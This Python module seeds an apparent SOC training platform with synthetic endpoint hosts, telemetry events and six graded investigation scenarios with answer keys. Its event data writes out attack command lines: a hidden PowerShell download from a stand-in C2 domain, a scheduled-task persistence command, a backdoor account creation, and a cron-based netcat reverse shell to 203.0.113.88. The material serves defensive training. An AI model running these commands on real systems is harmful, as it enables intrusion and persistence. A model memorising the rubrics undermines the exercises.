"""Synthetic dataset generator and scenario validation service for Endpoint Security."""

import json
from datetime import datetime, timedelta, timezone
from typing import Any

from sqlalchemy import func, select
from sqlalchemy.orm import Session

from app.models.endpoint_security import (
    EndpointEvent,
    EndpointHost,
    EndpointScenario,
)


class DatasetService:
    """Provides seed data generation and automated scenario grading."""

    @classmethod
    def seed_data(cls, db: Session) -> dict[str, int]:
        """Seed 4 synthetic hosts, realistic multi-category events, and 6 guided scenarios."""
        # 1. Seed Hosts
        now = datetime.now(timezone.utc)
        base_time = now - timedelta(hours=6)

        hosts_data = [
            {
                "stable_id": "HOST-WIN-001",
                "hostname": "NN-WIN-001",
                "display_name": "Windows 11 Workstation  -  HR Finance (NN-WIN-001)",
                "platform": "WINDOWS",
                "platform_version": "Windows 11 Enterprise 23H2",
                "architecture": "X64",
                "environment": "WORKSTATION",
                "status": "ONLINE",
                "risk_level": "LOW",
                "ip_address": "192.0.2.15",
                "mac_address": "00:15:5D:01:A2:10",
                "os_build": "22631.3007",
                "description": "Standard corporate laptop used by payroll personnel. Baseline workstation telemetry for beginner host analysis.",
                "last_activity_at": now - timedelta(minutes=10),
            },
            {
                "stable_id": "HOST-WIN-002",
                "hostname": "NN-WIN-002",
                "display_name": "Windows 11 Workstation  -  Engineering Dev (NN-WIN-002)",
                "platform": "WINDOWS",
                "platform_version": "Windows 11 Pro 23H2",
                "architecture": "X64",
                "environment": "WORKSTATION",
                "status": "ONLINE",
                "risk_level": "HIGH",
                "ip_address": "192.0.2.22",
                "mac_address": "00:15:5D:02:B3:21",
                "os_build": "22631.3155",
                "description": "Developer workstation reporting suspicious child processes spawned from PowerShell and outbound beaconing to RFC 5737 IPs.",
                "last_activity_at": now - timedelta(minutes=5),
            },
            {
                "stable_id": "HOST-LINUX-001",
                "hostname": "NN-LINUX-001",
                "display_name": "Linux Bastion & Jump Host (NN-LINUX-001)",
                "platform": "LINUX",
                "platform_version": "Ubuntu 22.04 LTS",
                "architecture": "X64",
                "environment": "SERVER",
                "status": "ONLINE",
                "risk_level": "CRITICAL",
                "ip_address": "198.51.100.10",
                "mac_address": "52:54:00:12:34:56",
                "os_build": "Linux 5.15.0-91-generic",
                "description": "Production SSH bastion proxy experiencing dictionary login attempts, unauthorized sudo commands, and cron task persistence.",
                "last_activity_at": now - timedelta(minutes=2),
            },
            {
                "stable_id": "HOST-SRV-001",
                "hostname": "NN-SRV-001",
                "display_name": "Windows Domain Controller (NN-SRV-001)",
                "platform": "WINDOWS",
                "platform_version": "Windows Server 2022 Datacenter",
                "architecture": "X64",
                "environment": "SERVER",
                "status": "ONLINE",
                "risk_level": "MEDIUM",
                "ip_address": "192.0.2.5",
                "mac_address": "00:15:5D:00:DC:01",
                "os_build": "20348.2227",
                "description": "Active Directory primary domain controller recording Windows Security Event 7045 service creation and administrative privileges.",
                "last_activity_at": now - timedelta(minutes=1),
            },
        ]

        host_map: dict[str, EndpointHost] = {}
        hosts_created = 0
        for hd in hosts_data:
            existing = db.execute(
                select(EndpointHost).where(EndpointHost.stable_id == hd["stable_id"])
            ).scalars().first()
            if not existing:
                h = EndpointHost(**hd)
                db.add(h)
                db.flush()
                host_map[hd["stable_id"]] = h
                hosts_created += 1
            else:
                host_map[hd["stable_id"]] = existing

        # 2. Seed Synthetic Events
        events_created = 0
        existing_event_count = db.scalar(select(func.count(EndpointEvent.id))) or 0
        if existing_event_count < 10:
            events_data = cls._generate_synthetic_events(host_map, base_time)
            for ed in events_data:
                ev = EndpointEvent(**ed)
                db.add(ev)
                events_created += 1
            db.flush()

        # 3. Seed Scenarios
        scenarios_created = 0
        scenarios_data = cls._get_scenarios_definitions()
        for sd in scenarios_data:
            existing_sc = db.execute(
                select(EndpointScenario).where(EndpointScenario.slug == sd["slug"])
            ).scalars().first()
            if not existing_sc:
                sc = EndpointScenario(**sd)
                db.add(sc)
                scenarios_created += 1

        db.commit()
        return {
            "hosts_created": hosts_created,
            "events_created": events_created,
            "scenarios_created": scenarios_created,
        }

    @classmethod
    def _generate_synthetic_events(
        cls, hosts: dict[str, EndpointHost], base: datetime
    ) -> list[dict[str, Any]]:
        """Generate structured synthetic telemetry across all required categories."""
        events: list[dict[str, Any]] = []

        h1 = hosts["HOST-WIN-001"]
        h2 = hosts["HOST-WIN-002"]
        h3 = hosts["HOST-LINUX-001"]
        h4 = hosts["HOST-SRV-001"]

        # === HOST 1: NN-WIN-001 (Beginner Baseline) ===
        events.extend([
            {
                "event_id": "EE-WIN1-001",
                "host_id": h1.id,
                "timestamp": base + timedelta(minutes=10),
                "event_type": "LOGIN_FAILURE",
                "event_category": "AUTHENTICATION",
                "username": "alice.johnson",
                "auth_method": "KERBEROS",
                "auth_failure_reason": "Bad password supplied",
                "source_ip": "192.0.2.15",
                "action": "LOGIN",
                "result": "FAILURE",
                "severity": "LOW",
                "raw_event_reference": "Security EventID 4625",
            },
            {
                "event_id": "EE-WIN1-002",
                "host_id": h1.id,
                "timestamp": base + timedelta(minutes=11),
                "event_type": "LOGIN_SUCCESS",
                "event_category": "AUTHENTICATION",
                "username": "alice.johnson",
                "auth_method": "KERBEROS",
                "source_ip": "192.0.2.15",
                "action": "LOGIN",
                "result": "SUCCESS",
                "severity": "INFO",
                "raw_event_reference": "Security EventID 4624",
            },
            {
                "event_id": "EE-WIN1-003",
                "host_id": h1.id,
                "timestamp": base + timedelta(minutes=12),
                "event_type": "PROCESS_START",
                "event_category": "PROCESS",
                "username": "alice.johnson",
                "process_name": "explorer.exe",
                "process_id": 1024,
                "parent_process_id": 4,
                "parent_process_name": "system",
                "command_summary": "C:\\Windows\\explorer.exe",
                "integrity_level": "STANDARD",
                "file_path": "C:\\Windows\\explorer.exe",
                "severity": "INFO",
            },
            {
                "event_id": "EE-WIN1-004",
                "host_id": h1.id,
                "timestamp": base + timedelta(minutes=15),
                "event_type": "PROCESS_START",
                "event_category": "PROCESS",
                "username": "alice.johnson",
                "process_name": "msedge.exe",
                "process_id": 2048,
                "parent_process_id": 1024,
                "parent_process_name": "explorer.exe",
                "command_summary": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"",
                "integrity_level": "STANDARD",
                "file_path": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                "severity": "INFO",
            },
            {
                "event_id": "EE-WIN1-005",
                "host_id": h1.id,
                "timestamp": base + timedelta(minutes=16),
                "event_type": "DNS_QUERY",
                "event_category": "DNS",
                "username": "alice.johnson",
                "process_name": "msedge.exe",
                "process_id": 2048,
                "domain": "portal.corporate.test",
                "dns_query_type": "A",
                "dns_response": "192.0.2.80",
                "result": "SUCCESS",
                "severity": "INFO",
            },
            {
                "event_id": "EE-WIN1-006",
                "host_id": h1.id,
                "timestamp": base + timedelta(minutes=17),
                "event_type": "NETWORK_CONNECTION",
                "event_category": "NETWORK",
                "username": "alice.johnson",
                "process_name": "msedge.exe",
                "process_id": 2048,
                "source_ip": "192.0.2.15",
                "source_port": 51240,
                "destination_ip": "192.0.2.80",
                "destination_port": 443,
                "protocol": "TCP",
                "domain": "portal.corporate.test",
                "action": "CONNECT",
                "result": "SUCCESS",
                "severity": "INFO",
            },
            {
                "event_id": "EE-WIN1-007",
                "host_id": h1.id,
                "timestamp": base + timedelta(minutes=25),
                "event_type": "FILE_CREATE",
                "event_category": "FILE",
                "username": "alice.johnson",
                "process_name": "msedge.exe",
                "process_id": 2048,
                "file_name": "Q3_Financial_Summary.pdf",
                "file_path": "C:\\Users\\alice.johnson\\Downloads\\Q3_Financial_Summary.pdf",
                "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                "file_action": "CREATE",
                "severity": "INFO",
            },
            {
                "event_id": "EE-WIN1-008",
                "host_id": h1.id,
                "timestamp": base + timedelta(hours=4),
                "event_type": "LOGOUT",
                "event_category": "AUTHENTICATION",
                "username": "alice.johnson",
                "source_ip": "192.0.2.15",
                "action": "LOGOUT",
                "result": "SUCCESS",
                "severity": "INFO",
                "raw_event_reference": "Security EventID 4634",
            },
        ])

        # === HOST 2: NN-WIN-002 (Intermediate Suspicious Investigation) ===
        events.extend([
            {
                "event_id": "EE-WIN2-001",
                "host_id": h2.id,
                "timestamp": base + timedelta(minutes=30),
                "event_type": "LOGIN_FAILURE",
                "event_category": "AUTHENTICATION",
                "username": "bob.developer",
                "auth_method": "NTLM",
                "source_ip": "198.51.100.45",
                "action": "LOGIN",
                "result": "FAILURE",
                "severity": "LOW",
                "raw_event_reference": "Security EventID 4625",
            },
            {
                "event_id": "EE-WIN2-002",
                "host_id": h2.id,
                "timestamp": base + timedelta(minutes=31),
                "event_type": "LOGIN_FAILURE",
                "event_category": "AUTHENTICATION",
                "username": "bob.developer",
                "auth_method": "NTLM",
                "source_ip": "198.51.100.45",
                "action": "LOGIN",
                "result": "FAILURE",
                "severity": "LOW",
                "raw_event_reference": "Security EventID 4625",
            },
            {
                "event_id": "EE-WIN2-003",
                "host_id": h2.id,
                "timestamp": base + timedelta(minutes=32),
                "event_type": "LOGIN_FAILURE",
                "event_category": "AUTHENTICATION",
                "username": "bob.developer",
                "auth_method": "NTLM",
                "source_ip": "198.51.100.45",
                "action": "LOGIN",
                "result": "FAILURE",
                "severity": "MEDIUM",
                "raw_event_reference": "Security EventID 4625",
            },
            {
                "event_id": "EE-WIN2-004",
                "host_id": h2.id,
                "timestamp": base + timedelta(minutes=33),
                "event_type": "LOGIN_SUCCESS",
                "event_category": "AUTHENTICATION",
                "username": "bob.developer",
                "auth_method": "NTLM",
                "source_ip": "198.51.100.45",
                "action": "LOGIN",
                "result": "SUCCESS",
                "severity": "MEDIUM",
                "raw_event_reference": "Security EventID 4624",
            },
            {
                "event_id": "EE-WIN2-005",
                "host_id": h2.id,
                "timestamp": base + timedelta(minutes=35),
                "event_type": "PROCESS_START",
                "event_category": "PROCESS",
                "username": "bob.developer",
                "process_name": "powershell.exe",
                "process_id": 4050,
                "parent_process_id": 1024,
                "parent_process_name": "explorer.exe",
                "command_summary": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri http://malicious-c2.training.test/update.exe -OutFile C:\\Users\\Public\\update.exe\"",
                "integrity_level": "STANDARD",
                "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "severity": "HIGH",
                "raw_event_reference": "Security EventID 4688",
            },
            {
                "event_id": "EE-WIN2-006",
                "host_id": h2.id,
                "timestamp": base + timedelta(minutes=36),
                "event_type": "DNS_QUERY",
                "event_category": "DNS",
                "username": "bob.developer",
                "process_name": "powershell.exe",
                "process_id": 4050,
                "domain": "malicious-c2.training.test",
                "dns_query_type": "A",
                "dns_response": "198.51.100.45",
                "result": "SUCCESS",
                "severity": "HIGH",
            },
            {
                "event_id": "EE-WIN2-007",
                "host_id": h2.id,
                "timestamp": base + timedelta(minutes=37),
                "event_type": "NETWORK_CONNECTION",
                "event_category": "NETWORK",
                "username": "bob.developer",
                "process_name": "powershell.exe",
                "process_id": 4050,
                "source_ip": "192.0.2.22",
                "source_port": 52110,
                "destination_ip": "198.51.100.45",
                "destination_port": 80,
                "protocol": "TCP",
                "domain": "malicious-c2.training.test",
                "action": "CONNECT",
                "result": "SUCCESS",
                "severity": "HIGH",
            },
            {
                "event_id": "EE-WIN2-008",
                "host_id": h2.id,
                "timestamp": base + timedelta(minutes=38),
                "event_type": "FILE_CREATE",
                "event_category": "FILE",
                "username": "bob.developer",
                "process_name": "powershell.exe",
                "process_id": 4050,
                "file_name": "update.exe",
                "file_path": "C:\\Users\\Public\\update.exe",
                "file_hash": "a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0",
                "file_action": "CREATE",
                "severity": "CRITICAL",
            },
            {
                "event_id": "EE-WIN2-009",
                "host_id": h2.id,
                "timestamp": base + timedelta(minutes=40),
                "event_type": "PROCESS_START",
                "event_category": "PROCESS",
                "username": "bob.developer",
                "process_name": "update.exe",
                "process_id": 5010,
                "parent_process_id": 4050,
                "parent_process_name": "powershell.exe",
                "command_summary": "C:\\Users\\Public\\update.exe --beacon",
                "integrity_level": "ELEVATED",
                "file_path": "C:\\Users\\Public\\update.exe",
                "file_hash": "a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0",
                "severity": "CRITICAL",
                "raw_event_reference": "Windows Defender Alert: Suspicious Process Launch",
            },
            {
                "event_id": "EE-WIN2-010",
                "host_id": h2.id,
                "timestamp": base + timedelta(minutes=42),
                "event_type": "SCHEDULED_TASK_CREATED",
                "event_category": "PERSISTENCE",
                "username": "bob.developer",
                "process_name": "schtasks.exe",
                "process_id": 5120,
                "parent_process_id": 5010,
                "parent_process_name": "update.exe",
                "command_summary": "schtasks.exe /create /tn \"WindowsSystemDiagnostics\" /tr \"C:\\Users\\Public\\update.exe\" /sc onlogon",
                "persistence_type": "SCHEDULED_TASK",
                "action": "CREATE_TASK",
                "result": "SUCCESS",
                "severity": "HIGH",
            },
        ])

        # === HOST 3: NN-LINUX-001 (Advanced Multi-Stage Investigation) ===
        events.extend([
            {
                "event_id": "EE-LNX-001",
                "host_id": h3.id,
                "timestamp": base + timedelta(minutes=50),
                "event_type": "LOGIN_FAILURE",
                "event_category": "AUTHENTICATION",
                "username": "root",
                "auth_method": "PASSWORD",
                "source_ip": "203.0.113.88",
                "action": "SSH_LOGIN",
                "result": "FAILURE",
                "severity": "LOW",
                "raw_event_reference": "sshd[10410]: Failed password for root",
            },
            {
                "event_id": "EE-LNX-002",
                "host_id": h3.id,
                "timestamp": base + timedelta(minutes=51),
                "event_type": "LOGIN_FAILURE",
                "event_category": "AUTHENTICATION",
                "username": "admin",
                "auth_method": "PASSWORD",
                "source_ip": "203.0.113.88",
                "action": "SSH_LOGIN",
                "result": "FAILURE",
                "severity": "LOW",
                "raw_event_reference": "sshd[10415]: Failed password for admin",
            },
            {
                "event_id": "EE-LNX-003",
                "host_id": h3.id,
                "timestamp": base + timedelta(minutes=52),
                "event_type": "LOGIN_SUCCESS",
                "event_category": "AUTHENTICATION",
                "username": "deploy_user",
                "auth_method": "PASSWORD",
                "source_ip": "203.0.113.88",
                "action": "SSH_LOGIN",
                "result": "SUCCESS",
                "severity": "HIGH",
                "raw_event_reference": "sshd[10420]: Accepted password for deploy_user",
            },
            {
                "event_id": "EE-LNX-004",
                "host_id": h3.id,
                "timestamp": base + timedelta(minutes=54),
                "event_type": "PROCESS_START",
                "event_category": "PROCESS",
                "username": "deploy_user",
                "process_name": "bash",
                "process_id": 10425,
                "parent_process_id": 10420,
                "parent_process_name": "sshd",
                "command_summary": "/bin/bash",
                "integrity_level": "STANDARD",
                "file_path": "/bin/bash",
                "severity": "INFO",
            },
            {
                "event_id": "EE-LNX-005",
                "host_id": h3.id,
                "timestamp": base + timedelta(minutes=56),
                "event_type": "PRIVILEGE_CHANGE",
                "event_category": "PRIVILEGE",
                "username": "deploy_user",
                "process_name": "sudo",
                "process_id": 10430,
                "parent_process_id": 10425,
                "parent_process_name": "bash",
                "command_summary": "sudo -u root /usr/bin/useradd -m -s /bin/bash guest_admin",
                "integrity_level": "ELEVATED",
                "action": "SUDO_EXEC",
                "result": "SUCCESS",
                "severity": "CRITICAL",
                "raw_event_reference": "sudo: deploy_user : TTY=pts/0 ; PWD=/home/deploy_user ; USER=root ; COMMAND=/usr/bin/useradd",
            },
            {
                "event_id": "EE-LNX-006",
                "host_id": h3.id,
                "timestamp": base + timedelta(minutes=58),
                "event_type": "ACCOUNT_CREATED",
                "event_category": "ACCOUNT",
                "username": "guest_admin",
                "process_name": "useradd",
                "process_id": 10431,
                "action": "CREATE_USER",
                "result": "SUCCESS",
                "severity": "HIGH",
            },
            {
                "event_id": "EE-LNX-007",
                "host_id": h3.id,
                "timestamp": base + timedelta(minutes=62),
                "event_type": "FILE_CREATE",
                "event_category": "PERSISTENCE",
                "username": "root",
                "process_name": "bash",
                "process_id": 10425,
                "file_name": "backup_sync",
                "file_path": "/etc/cron.d/backup_sync",
                "file_action": "CREATE",
                "persistence_type": "CRON_JOB",
                "command_summary": "echo '* * * * * root /bin/nc -e /bin/bash 203.0.113.88 4444' > /etc/cron.d/backup_sync",
                "severity": "CRITICAL",
            },
            {
                "event_id": "EE-LNX-008",
                "host_id": h3.id,
                "timestamp": base + timedelta(minutes=65),
                "event_type": "NETWORK_CONNECTION",
                "event_category": "NETWORK",
                "username": "root",
                "process_name": "nc",
                "process_id": 10500,
                "parent_process_id": 1,
                "parent_process_name": "cron",
                "source_ip": "198.51.100.10",
                "source_port": 49102,
                "destination_ip": "203.0.113.88",
                "destination_port": 4444,
                "protocol": "TCP",
                "action": "OUTBOUND_CONNECT",
                "result": "SUCCESS",
                "severity": "CRITICAL",
            },
        ])

        # === HOST 4: NN-SRV-001 (Domain Controller) ===
        events.extend([
            {
                "event_id": "EE-SRV-001",
                "host_id": h4.id,
                "timestamp": base + timedelta(hours=1, minutes=10),
                "event_type": "LOGIN_SUCCESS",
                "event_category": "AUTHENTICATION",
                "username": "svc_backup",
                "auth_method": "KERBEROS",
                "source_ip": "192.0.2.15",
                "action": "SERVICE_LOGON",
                "result": "SUCCESS",
                "severity": "INFO",
                "raw_event_reference": "Security EventID 4624",
            },
            {
                "event_id": "EE-SRV-002",
                "host_id": h4.id,
                "timestamp": base + timedelta(hours=1, minutes=15),
                "event_type": "SERVICE_START",
                "event_category": "SERVICE",
                "username": "SYSTEM",
                "service_name": "NN-Diagnostic-Agent",
                "service_display_name": "NexoraNet Diagnostic Host Collector",
                "service_action": "START",
                "action": "START_SERVICE",
                "result": "SUCCESS",
                "severity": "MEDIUM",
                "raw_event_reference": "System EventID 7045",
            },
            {
                "event_id": "EE-SRV-003",
                "host_id": h4.id,
                "timestamp": base + timedelta(hours=1, minutes=20),
                "event_type": "SECURITY_POLICY_CHANGE",
                "event_category": "SECURITY",
                "username": "domain_admin",
                "command_summary": "Audit Policy Change: Success and Failure auditing enabled for Object Access",
                "action": "POLICY_UPDATE",
                "result": "SUCCESS",
                "severity": "LOW",
                "raw_event_reference": "Security EventID 4719",
            },
        ])

        return events

    @classmethod
    def _get_scenarios_definitions(cls) -> list[dict[str, Any]]:
        """Educational guided training scenarios."""
        return [
            {
                "scenario_id": "ESCEN-01",
                "slug": "failed-login-investigation",
                "title": "Scenario 1  -  Failed Login & Authentication Triage",
                "difficulty": "BEGINNER",
                "category": "AUTHENTICATION",
                "target_host_stable_id": "HOST-WIN-001",
                "description": "Investigate authentication logs to determine whether an observed login failure represents an attack or normal user error.",
                "background": "The SOC alerted on an authentication failure on host NN-WIN-001. Review the host overview, authentication logs, and subsequent process activity to verify if the account was compromised.",
                "objectives_json": json.dumps([
                    "Navigate to host NN-WIN-001 in Endpoint Security",
                    "Filter authentication events for username 'alice.johnson'",
                    "Identify the total number of failed logons before success",
                    "Verify the source IP of the authentication attempt",
                    "Document whether the evidence supports a benign password mistype or unauthorized brute-force",
                ]),
                "hints_json": json.dumps([
                    "Inspect the Authentication tab on NN-WIN-001",
                    "Notice the source IP matches the local workstation IP (192.0.2.15)",
                    "Check if any unauthorized processes spawned immediately after login",
                ]),
                "solution_rubric_json": json.dumps({
                    "expected_user": "alice.johnson",
                    "expected_failures": 1,
                    "verdict": "BENIGN_ANOMALY",
                    "source_ip": "192.0.2.15",
                }),
                "estimated_minutes": 15,
            },
            {
                "scenario_id": "ESCEN-02",
                "slug": "process-tree-investigation",
                "title": "Scenario 2  -  Suspicious Process Tree & Parentage",
                "difficulty": "INTERMEDIATE",
                "category": "PROCESS",
                "target_host_stable_id": "HOST-WIN-002",
                "background": "An endpoint alert was raised for an anomalous child process spawned on developer workstation NN-WIN-002.",
                "description": "Reconstruct the process hierarchy to identify the malicious parent process, executable hash, and command-line execution arguments.",
                "objectives_json": json.dumps([
                    "Open the Process Tree view for host NN-WIN-002",
                    "Locate powershell.exe and identify its parent process and PID",
                    "Trace which child process was spawned by powershell.exe",
                    "Inspect the command_summary to identify the download URL and destination binary",
                    "Extract the SHA256 file hash of update.exe",
                ]),
                "hints_json": json.dumps([
                    "Expand explorer.exe in the visual process tree",
                    "Look for powershell.exe with -ExecutionPolicy Bypass parameters",
                    "Notice child process update.exe running with elevated integrity",
                ]),
                "solution_rubric_json": json.dumps({
                    "parent_process": "powershell.exe",
                    "child_process": "update.exe",
                    "download_path": "C:\\Users\\Public\\update.exe",
                    "hash_prefix": "a1b2c3d4",
                }),
                "estimated_minutes": 20,
            },
            {
                "scenario_id": "ESCEN-03",
                "slug": "suspicious-network-activity",
                "title": "Scenario 3  -  Outbound Network Beaconing & DNS Triage",
                "difficulty": "INTERMEDIATE",
                "category": "NETWORK",
                "target_host_stable_id": "HOST-WIN-002",
                "background": "Firewall logs report repeated outbound connections from NN-WIN-002 to an external IP. Correlate with endpoint DNS and process telemetry.",
                "description": "Trace outbound network connections back to the responsible endpoint process and queried domain.",
                "objectives_json": json.dumps([
                    "Filter Network events on NN-WIN-002 for destination port 80",
                    "Correlate the connection with a preceding DNS query",
                    "Identify the domain name queried by powershell.exe",
                    "Pivot the remote IP into Threat Intelligence to inspect its reputation",
                ]),
                "hints_json": json.dumps([
                    "Review the DNS tab on NN-WIN-002 for queries matching 'training.test'",
                    "Use the 'Pivot to Threat Intel' button on the network connection event",
                ]),
                "solution_rubric_json": json.dumps({
                    "remote_ip": "198.51.100.45",
                    "queried_domain": "malicious-c2.training.test",
                    "process": "powershell.exe",
                }),
                "estimated_minutes": 20,
            },
            {
                "scenario_id": "ESCEN-04",
                "slug": "file-hash-investigation",
                "title": "Scenario 4  -  Executable Drop & File Hash Investigation",
                "difficulty": "INTERMEDIATE",
                "category": "FILE",
                "target_host_stable_id": "HOST-WIN-002",
                "background": "A new executable file was written to a public directory on NN-WIN-002.",
                "description": "Analyze the file creation event, verify file location, extract its cryptographic hash, and document IOC indicators.",
                "objectives_json": json.dumps([
                    "Inspect the Files tab on NN-WIN-002",
                    "Locate file update.exe in C:\\Users\\Public",
                    "Extract the SHA256 file hash",
                    "Add the file hash as evidence in a new investigation case",
                ]),
                "hints_json": json.dumps([
                    "Filter file events by action CREATE",
                    "Check the file details modal to view full cryptographic hash",
                ]),
                "solution_rubric_json": json.dumps({
                    "file_name": "update.exe",
                    "file_path": "C:\\Users\\Public\\update.exe",
                }),
                "estimated_minutes": 15,
            },
            {
                "scenario_id": "ESCEN-05",
                "slug": "persistence-investigation",
                "title": "Scenario 5  -  Scheduled Task & Service Persistence",
                "difficulty": "ADVANCED",
                "category": "PERSISTENCE",
                "target_host_stable_id": "HOST-WIN-002",
                "background": "Adversaries often configure scheduled tasks or services to retain access across reboots.",
                "description": "Identify persistence artifacts on NN-WIN-002 created by the suspicious binary.",
                "objectives_json": json.dumps([
                    "Inspect the Services & Persistence tab on NN-WIN-002",
                    "Identify the task name created by schtasks.exe",
                    "Determine the trigger condition for the scheduled task",
                    "Formulate a hypothesis regarding adversary persistence technique T1053.005",
                ]),
                "hints_json": json.dumps([
                    "Look for command argument /tn WindowsSystemDiagnostics",
                    "Check the schedule argument /sc onlogon",
                ]),
                "solution_rubric_json": json.dumps({
                    "task_name": "WindowsSystemDiagnostics",
                    "trigger": "onlogon",
                    "mitre_id": "T1053.005",
                }),
                "estimated_minutes": 25,
            },
            {
                "scenario_id": "ESCEN-06",
                "slug": "multi-stage-endpoint-investigation",
                "title": "Scenario 6  -  Multi-Stage Compromise Timeline Reconstruction",
                "difficulty": "ADVANCED",
                "category": "TIMELINE",
                "target_host_stable_id": "HOST-LINUX-001",
                "background": "Linux jump host NN-LINUX-001 has been flagged for multiple critical severity alerts.",
                "description": "Reconstruct the chronological timeline from initial SSH dictionary attack to backdoor user creation and reverse shell establishment.",
                "objectives_json": json.dumps([
                    "View the unified host timeline for NN-LINUX-001",
                    "Identify the compromised account used to gain initial access",
                    "Find the unauthorized user created via sudo privilege escalation",
                    "Inspect the cron persistence script configured in /etc/cron.d/backup_sync",
                    "Submit an investigation conclusion and earn your Training Score",
                ]),
                "hints_json": json.dumps([
                    "Chronologically trace events from EE-LNX-001 through EE-LNX-008",
                    "Note the compromised user deploy_user",
                    "Identify the backdoor user guest_admin",
                ]),
                "solution_rubric_json": json.dumps({
                    "compromised_account": "deploy_user",
                    "backdoor_user": "guest_admin",
                    "outbound_c2_ip": "203.0.113.88",
                    "verdict": "CONFIRMED_COMPROMISE",
                }),
                "estimated_minutes": 30,
            },
        ]

    @classmethod
    def validate_scenario(
        cls, db: Session, slug: str, submission: dict[str, Any]
    ) -> dict[str, Any]:
        """Grade student scenario responses against the defined solution rubric."""
        sc = db.execute(
            select(EndpointScenario).where(EndpointScenario.slug == slug)
        ).scalars().first()
        if not sc:
            raise ValueError(f"Scenario with slug '{slug}' not found.")

        rubric = json.loads(sc.solution_rubric_json) if sc.solution_rubric_json else {}
        answers = submission.get("answers", {})

        score = 0
        total_criteria = len(rubric)
        feedback: list[str] = []

        for key, expected_val in rubric.items():
            user_val = str(answers.get(key, "")).strip().lower()
            exp_str = str(expected_val).strip().lower()

            if user_val and (user_val == exp_str or exp_str in user_val):
                score += 1
                feedback.append(f"✓ Objective '{key}': Verified correctly.")
            else:
                feedback.append(
                    f"✗ Objective '{key}': Did not match expected criteria. Review host telemetry and hints."
                )

        pct = int((score / total_criteria) * 100) if total_criteria > 0 else 100
        passed = pct >= 70

        return {
            "scenario_id": sc.scenario_id,
            "title": sc.title,
            "score": pct,
            "passed": passed,
            "criteria_met": f"{score}/{total_criteria}",
            "feedback": feedback,
            "disclaimer": "This is an educational training validation for synthetic endpoint analysis.",
        }
